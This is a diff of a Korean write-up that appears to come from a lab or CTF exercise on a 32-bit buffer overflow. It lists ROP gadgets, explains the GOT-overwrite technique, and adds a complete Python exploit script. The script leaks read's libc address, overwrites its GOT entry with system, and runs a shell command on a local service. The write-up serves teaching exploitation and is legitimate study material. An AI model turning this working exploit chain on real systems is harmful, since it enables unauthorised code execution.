@@ -23,13 +23,14 @@ buf의 크기는 총 0x88(136) + SFP = (140)인데, 입력은 0x100(256)만큼 �
 즉 버퍼오버플로우가 일어나게 됩니다.
 
 이제 익스플로잇에 필요한 가젯들을 정리해 보면,
+```
 1. read_plt, read_got
 2. write_plt, write_got
 3. pppr
 4. dynamic_addr -> bss영역을 사용하지 않는 이유는 영역이 작아서 입니다.
 5. read - system libc offset
   └ Offset을 구하는 이유는 주소가 가변적으로 바뀌어도 offset은 고정이기 때문에 이 offset에 base주소를 더해 주면, 원래 system주소가 나오기 때문입니다.
-
+```
 read - system을 하여 system의 offset을 구한다음 read_got의 addr를 얻어 구한 system offset을 빼면 원래의 system 주소가 나오게 됩니다.
 
 가젯들을 구할 때에는 objdump -d, -h와 gdb를 이용하여 구하였습니다.
@@ -37,17 +38,18 @@ read - system을 하여 system의 offset을 구한다음 read_got의 addr를 얻
 read - system을 하여 offset을 구할 때에는 gdb로 아무데나 b를 걸고 달린후 p system, p read를 이용하여 구해주시면 됩니다.
 
 익스플로잇 순서는
+```
 1. 익스플로잇에 필요한 가젯들을 구합니다.
 2. 구한 가젯들을 조합하여 페이로드를 작성합니다.
   
-  └ write_plt에 read_got를 인자로 주어 로드된 read 주소를 얻어옵니다.
+      └ write_plt에 read_got를 인자로 주어 로드된 read 주소를 얻어옵니다.
 
-  └ 그 후 read_plt를 이용하여 dynamic섹션에 명령어를 받습니다.
+      └ 그 후 read_plt를 이용하여 dynamic섹션에 명령어를 받습니다.
 
-  └ got overwrite를 이용하여 read_got를 구한 system주소를 씁니다.
+      └ got overwrite를 이용하여 read_got를 구한 system주소를 씁니다.
 
-  └ read_plt(system)에 dynamic섹션 영역을 인자로 주어 실행합니다.
-
+      └ read_plt(system)에 dynamic섹션 영역을 인자로 주어 실행합니다.
+```
 ###Got Overwrite?
 Got Overwrite란 read, write함수 등 함수들은 plt주소와 got주소를 가지고 있는데,
 
@@ -73,4 +75,66 @@ got는 plt가 참조하는 테이블이고, 프로시저들의 주소가 들어�
 Ubuntu 16 LTS 32bit 환경에서 테스팅 해보았습니다.
 
 ```
+#!/usr/bin/python
+
+from socket import *
+from struct import *
+from time import *
+
+p = lambda x: pack("<L", x)
+up = lambda x : unpack("<L", x)[0]
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect(('127.0.0.1', 6666))
+
+read_plt = 0x804832C
+read_got = 0x804961C
+write_plt = 0x804830C
+write_got = 0x8049614
+pppr = 0x80484b6
+
+dynamic_addr = 0x8049530
+read_system_libc = 0x9abe0
+
+cmd = 'ls -al'
+
+print "[+]Exploit!"
+payload = ''
+payload += 'A' * 140
+#Get target write libc address
+payload += p(write_plt)
+payload += p(pppr)
+payload += p(0x1) #stdout
+payload += p(read_got)
+payload += p(0x4)
+#write in dynamic section
+payload += p(read_plt)
+payload += p(pppr)
+payload += p(0x0) #stdin
+payload += p(dynamic_addr)
+payload += p(len(cmd))
+#got overwrite
+payload += p(read_plt)
+payload += p(pppr)
+payload += p(0x0)
+payload += p(read_got)
+payload += p(0x4)
+#system call
+payload += p(read_plt)
+payload += p(0x41414141)
+payload += p(dynamic_addr)
+
+s.send(payload)
+
+#libc distance calc
+read_libc = up(s.recv(4))
+system_addr = read_libc - read_system_libc
+print "System addr [*]" + hex(system_addr)
+
+s.send(cmd)
+s.send(p(system_addr))
+
+print s.recv(1024)
+print "Finish!"
+
 ```
